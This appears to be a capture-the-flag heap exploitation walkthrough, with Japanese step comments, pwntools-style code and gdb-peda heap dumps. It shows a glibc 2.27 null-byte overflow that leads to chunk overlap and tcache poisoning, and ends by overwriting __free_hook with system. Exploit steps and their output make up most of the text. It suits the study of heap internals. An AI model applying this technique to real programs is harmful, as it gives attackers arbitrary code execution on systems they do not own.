@@ -1,0 +1,327 @@
+gdb-peda$ parseheap
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Freed                0x0              None
+0x84032e0           0x0                 0x90                 Freed          0x8403260              None
+0x8403370           0x0                 0x90                 Freed          0x84032f0              None
+0x8403400           0x0                 0x90                 Freed          0x8403380              None
+0x8403490           0x0                 0x90                 Freed          0x8403410              None
+0x8403520           0x0                 0x90                 Freed          0x84034a0              None
+0x84035b0           0x0                 0x90                 Freed          0x8403530              None
+0x8403640           0x0                 0x100                Used                None              None
+0x8403740           0x0                 0x100                Used                None              None
+0x8403840           0x0                 0x100                Used                None              None
+0x8403940           0x0                 0x100                Used                None              None
+0x8403a40           0x0                 0x100                Used                None              None
+0x8403b40           0x0                 0x100                Used                None              None
+0x8403c40           0x0                 0x100                Used                None              None
+0x8403d40           0x0                 0x90                 Used                None              None
+0x8403dd0           0x0                 0x20                 Used                None              None
+0x8403df0           0x0                 0x100                Used                None              None
+0x8403ef0           0x0                 0x20                 Used                None              None
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x0
+(0x90)   tcache_entry[7](7): 0x84035c0 --> 0x8403530 --> 0x84034a0 --> 0x8403410 --> 0x8403380 --> 0x84032f0 --> 0x8403260
+
+
+# チャンクAを解放
+delete(A)
+
+gdb-peda$ parseheap
+addr        prev        size         status              fd                bk
+0x8403000   0x0         0x250        Used                None              None
+0x8403250   0x0         0x90         Freed                0x0              None
+0x84032e0   0x0         0x90         Freed          0x8403260              None
+0x8403370   0x0         0x90         Freed          0x84032f0              None
+0x8403400   0x0         0x90         Freed          0x8403380              None
+0x8403490   0x0         0x90         Freed          0x8403410              None
+0x8403520   0x0         0x90         Freed          0x84034a0              None
+0x84035b0   0x0         0x90         Freed          0x8403530              None
+0x8403640   0x0         0x100        Used                None              None
+0x8403740   0x0         0x100        Used                None              None
+0x8403840   0x0         0x100        Used                None              None
+0x8403940   0x0         0x100        Used                None              None
+0x8403a40   0x0         0x100        Used                None              None
+0x8403b40   0x0         0x100        Used                None              None
+0x8403c40   0x0         0x100        Used                None              None
+0x8403d40   0x0         0x90         Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403dd0   0x90        0x20         Used                None              None
+0x8403df0   0x0         0x100        Used                None              None
+0x8403ef0   0x0         0x20         Used                None              None
+gdb-peda$ heapinfo
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x8403d40 (size : 0x90)
+(0x90)   tcache_entry[7](7): 0x84035c0 --> 0x8403530 --> 0x84034a0 --> 0x8403410 --> 0x8403380 --> 0x84032f0 --> 0x8403260
+
+
+# チャンクCの、PREV_INUSEビットを0に、prev_sizeを0xb0にする
+for i in range(8):
+  delete(B)
+  store(B, 'a'*(0x18-i))
+delete(B)
+store(B, b'a'*0x10+b'\xb0')
+
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Freed                0x0              None
+0x84032e0           0x0                 0x90                 Freed          0x8403260              None
+0x8403370           0x0                 0x90                 Freed          0x84032f0              None
+0x8403400           0x0                 0x90                 Freed          0x8403380              None
+0x8403490           0x0                 0x90                 Freed          0x8403410              None
+0x8403520           0x0                 0x90                 Freed          0x84034a0              None
+0x84035b0           0x0                 0x90                 Freed          0x8403530              None
+0x8403640           0x0                 0x100                Used                None              None
+0x8403740           0x0                 0x100                Used                None              None
+0x8403840           0x0                 0x100                Used                None              None
+0x8403940           0x0                 0x100                Used                None              None
+0x8403a40           0x0                 0x100                Used                None              None
+0x8403b40           0x0                 0x100                Used                None              None
+0x8403c40           0x0                 0x100                Used                None              None
+0x8403d40           0x0                 0x90                 Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403dd0           0x90                0x20                 Freed 0x61616161616161610x6161616161616161
+0x8403df0           0xb0                0x100                Used                None              None
+0x8403ef0           0x0                 0x20                 Used                None              None
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x8403d40 (size : 0x90)
+(0x90)   tcache_entry[7](7): 0x84035c0 --> 0x8403530 --> 0x84034a0 --> 0x8403410 --> 0x8403380 --> 0x84032f0 --> 0x8403260
+
+
+# チャンクCを解放
+for i in range(7):
+  delete(i+7)
+delete(C)
+
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Freed                0x0              None
+0x84032e0           0x0                 0x90                 Freed          0x8403260              None
+0x8403370           0x0                 0x90                 Freed          0x84032f0              None
+0x8403400           0x0                 0x90                 Freed          0x8403380              None
+0x8403490           0x0                 0x90                 Freed          0x8403410              None
+0x8403520           0x0                 0x90                 Freed          0x84034a0              None
+0x84035b0           0x0                 0x90                 Freed          0x8403530              None
+0x8403640           0x0                 0x100                Freed                0x0              None
+0x8403740           0x0                 0x100                Freed          0x8403650              None
+0x8403840           0x0                 0x100                Freed          0x8403750              None
+0x8403940           0x0                 0x100                Freed          0x8403850              None
+0x8403a40           0x0                 0x100                Freed          0x8403950              None
+0x8403b40           0x0                 0x100                Freed          0x8403a50              None
+0x8403c40           0x0                 0x100                Freed          0x8403b50              None
+0x8403d40           0x0                 0x1b0                Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403ef0           0x1b0               0x20                 Used                None              None
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x0 (size : 0x0)
+            unsortbin: 0x8403d40 (size : 0x1b0)
+(0x90)   tcache_entry[7](7): 0x84035c0 --> 0x8403530 --> 0x84034a0 --> 0x8403410 --> 0x8403380 --> 0x84032f0 --> 0x8403260
+(0x100)   tcache_entry[14](7): 0x8403c50 --> 0x8403b50 --> 0x8403a50 --> 0x8403950 --> 0x8403850 --> 0x8403750 --> 0x8403650
+
+
+# チャンクAを再度確保する
+for i in range(7):
+  store(i, 'a'*0x80)
+store(A, 'a'*0x80)
+
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Used                None              None
+0x84032e0           0x0                 0x90                 Used                None              None
+0x8403370           0x0                 0x90                 Used                None              None
+0x8403400           0x0                 0x90                 Used                None              None
+0x8403490           0x0                 0x90                 Used                None              None
+0x8403520           0x0                 0x90                 Used                None              None
+0x84035b0           0x0                 0x90                 Used                None              None
+0x8403640           0x0                 0x100                Freed                0x0              None
+0x8403740           0x0                 0x100                Freed          0x8403650              None
+0x8403840           0x0                 0x100                Freed          0x8403750              None
+0x8403940           0x0                 0x100                Freed          0x8403850              None
+0x8403a40           0x0                 0x100                Freed          0x8403950              None
+0x8403b40           0x0                 0x100                Freed          0x8403a50              None
+0x8403c40           0x0                 0x100                Freed          0x8403b50              None
+0x8403d40           0x0                 0x90                 Used                None              None
+0x8403dd0           0x0                 0x120                Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403ef0           0x120               0x20                 Used                None              None
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x8403dd0 (size : 0x120)
+            unsortbin: 0x8403dd0 (size : 0x120)
+(0x100)   tcache_entry[14](7): 0x8403c50 --> 0x8403b50 --> 0x8403a50 --> 0x8403950 --> 0x8403850 --> 0x8403750 --> 0x8403650
+
+
+# チャンクBと同じアドレスからチャンクを確保
+B2 = 0
+store(B2, 'a')
+
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Used                None              None
+0x84032e0           0x0                 0x90                 Used                None              None
+0x8403370           0x0                 0x90                 Used                None              None
+0x8403400           0x0                 0x90                 Used                None              None
+0x8403490           0x0                 0x90                 Used                None              None
+0x8403520           0x0                 0x90                 Used                None              None
+0x84035b0           0x0                 0x90                 Used                None              None
+0x8403640           0x0                 0x100                Freed                0x0              None
+0x8403740           0x0                 0x100                Freed          0x8403650              None
+0x8403840           0x0                 0x100                Freed          0x8403750              None
+0x8403940           0x0                 0x100                Freed          0x8403850              None
+0x8403a40           0x0                 0x100                Freed          0x8403950              None
+0x8403b40           0x0                 0x100                Freed          0x8403a50              None
+0x8403c40           0x0                 0x100                Freed          0x8403b50              None
+0x8403d40           0x0                 0x90                 Used                None              None
+0x8403dd0           0x0                 0x20                 Used                None              None
+0x8403df0           0xb0                0x100                Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403ef0           0x100               0x20                 Used                None              None
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x8403df0 (size : 0x100)
+            unsortbin: 0x8403df0 (size : 0x100)
+(0x100)   tcache_entry[14](7): 0x8403c50 --> 0x8403b50 --> 0x8403a50 --> 0x8403950 --> 0x8403850 --> 0x8403750 --> 0x8403650
+
+
+s.sendlineafter('command: ', '3')
+
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Used                None              None
+0x84032e0           0x0                 0x90                 Used                None              None
+0x8403370           0x0                 0x90                 Used                None              None
+0x8403400           0x0                 0x90                 Used                None              None
+0x8403490           0x0                 0x90                 Used                None              None
+0x8403520           0x0                 0x90                 Used                None              None
+0x84035b0           0x0                 0x90                 Used                None              None
+0x8403640           0x0                 0x100                Freed                0x0              None
+0x8403740           0x0                 0x100                Freed          0x8403650              None
+0x8403840           0x0                 0x100                Freed          0x8403750              None
+0x8403940           0x0                 0x100                Freed          0x8403850              None
+0x8403a40           0x0                 0x100                Freed          0x8403950              None
+0x8403b40           0x0                 0x100                Freed          0x8403a50              None
+0x8403c40           0x0                 0x100                Freed          0x8403b50              None
+0x8403d40           0x0                 0x90                 Used                None              None
+0x8403dd0           0x0                 0x20                 Freed          0x8403de0              None
+0x8403df0           0xb0                0x100                Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403ef0           0x100               0x20                 Used                None              None
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x8403df0 (size : 0x100)
+            unsortbin: 0x8403df0 (size : 0x100)
+(0x20)   tcache_entry[0](2): 0x8403de0 --> 0x8403de0 (overlap chunk with 0x8403dd0(freed) )
+(0x100)   tcache_entry[14](7): 0x8403c50 --> 0x8403b50 --> 0x8403a50 --> 0x8403950 --> 0x8403850 --> 0x8403750 --> 0x8403650
+
+
+# __free_hook = system
+libc = ELF('libc-2.27.so')
+libc.address = libcbase
+store(B, pack(libc.symbols.__free_hook))
+store(B, 'a')
+store(B, pack(libc.symbols.system))
+
+addr                prev                size                 status              fd                bk
+0x8403000           0x0                 0x250                Used                None              None
+0x8403250           0x0                 0x90                 Used                None              None
+0x84032e0           0x0                 0x90                 Used                None              None
+0x8403370           0x0                 0x90                 Used                None              None
+0x8403400           0x0                 0x90                 Used                None              None
+0x8403490           0x0                 0x90                 Used                None              None
+0x8403520           0x0                 0x90                 Used                None              None
+0x84035b0           0x0                 0x90                 Used                None              None
+0x8403640           0x0                 0x100                Freed                0x0              None
+0x8403740           0x0                 0x100                Freed          0x8403650              None
+0x8403840           0x0                 0x100                Freed          0x8403750              None
+0x8403940           0x0                 0x100                Freed          0x8403850              None
+0x8403a40           0x0                 0x100                Freed          0x8403950              None
+0x8403b40           0x0                 0x100                Freed          0x8403a50              None
+0x8403c40           0x0                 0x100                Freed          0x8403b50              None
+0x8403d40           0x0                 0x90                 Used                None              None
+0x8403dd0           0x0                 0x20                 Used                None              None
+0x8403df0           0xb0                0x100                Freed     0x7fffff3ebca0    0x7fffff3ebca0
+0x8403ef0           0x100               0x20                 Used                None              None
+(0x20)     fastbin[0]: 0x0
+(0x30)     fastbin[1]: 0x0
+(0x40)     fastbin[2]: 0x0
+(0x50)     fastbin[3]: 0x0
+(0x60)     fastbin[4]: 0x0
+(0x70)     fastbin[5]: 0x0
+(0x80)     fastbin[6]: 0x0
+(0x90)     fastbin[7]: 0x0
+(0xa0)     fastbin[8]: 0x0
+(0xb0)     fastbin[9]: 0x0
+                  top: 0x8403f10 (size : 0x200f0)
+       last_remainder: 0x8403df0 (size : 0x100)
+            unsortbin: 0x8403df0 (size : 0x100)
+(0x20)   tcache_entry[0](255): 0
+(0x100)   tcache_entry[14](7): 0x8403c50 --> 0x8403b50 --> 0x8403a50 --> 0x8403950 --> 0x8403850 --> 0x8403750 --> 0x8403650
+
+gdb-peda$ p __free_hook
+$1 = (void (*)(void *, const void *)) 0x7fffff04f440 <__libc_system>
+
